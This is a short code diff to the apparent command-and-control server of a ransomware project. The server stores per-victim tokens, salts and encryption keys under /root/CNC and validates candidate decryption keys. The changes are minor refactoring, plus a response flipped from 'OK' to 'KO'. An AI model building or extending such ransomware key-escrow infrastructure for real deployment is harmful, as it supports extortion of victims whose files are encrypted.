@@ -9,7 +9,7 @@ from requests import Response
 from cncbase import CNCBase
 
 class CNC(CNCBase):
-    ROOT_PATH = "/root/CNC"
+    ROOT_PATH = "/root/CNC/"
 
     def save_b64(self, token:str, data:str, filename:str):
         # helper
@@ -27,7 +27,7 @@ class CNC(CNCBase):
     """
     def post_new(self, path:str, params:dict, body:dict)->dict:
         
-        os.makedirs('/root/CNC', exist_ok=True)
+        os.makedirs(CNC.ROOT_PATH, exist_ok=True)
 
         # Decode the values
         token = base64.b64decode(body["token"])
@@ -48,7 +48,7 @@ class CNC(CNCBase):
         with open(folder_token_name + "/salt.bin", "wb") as f:
             f.write(salt)
 
-        return {"status":"OK"}
+        return {"status":"KO"}
 
     """
         Function raise when the HTTP server receive a
@@ -100,7 +100,7 @@ class CNC(CNCBase):
         # Obtain the token for authentificated the client
         token = base64.b64decode(body["token"])
 
-        folder_token_name = "/root/CNC/" + token.hex() # str(m.hexdigest())
+        folder_token_name = CNC.ROOT_PATH + token.hex() # str(m.hexdigest())
         file_path = folder_token_name + "/key.bin"
         
          # Obtain the candidate key from the client
@@ -110,7 +110,6 @@ class CNC(CNCBase):
             f = open(file_path, "rb")
             key = f.read()
         except: # Token error
-            f.close()
             return {"valide":-1} 
         f.close()
 
